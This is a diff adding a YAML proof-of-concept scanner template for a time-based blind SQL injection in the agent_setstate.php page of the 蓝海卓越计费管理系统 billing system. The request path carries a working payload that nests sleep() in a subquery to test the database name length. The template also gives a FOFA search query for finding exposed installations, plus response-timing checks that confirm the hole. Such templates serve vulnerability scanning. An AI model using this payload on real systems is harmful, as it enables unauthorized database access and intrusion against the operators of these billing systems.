@@ -1,0 +1,17 @@
+id: poc-yaml-natshell-bms-agent-setstat-sqli
+info:
+  name: 蓝海卓越计费管理系统 agent_setstat SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 蓝海卓越计费管理系统
+  fofa: title=="蓝海卓越计费管理系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /agent_setstate.php?id=1+AND+(SELECT+4964+FROM+(SELECT(if(length(database())=6,sleep({{.t1}}),1)))uQqn)
+  expression: status_code == 200 && contains(title,"设置代理账户状态") && contains(body,"设置代理账号状态失败")
+    && contains(body,"location.href=") && duration > t1 && duration < t2
+transport: http
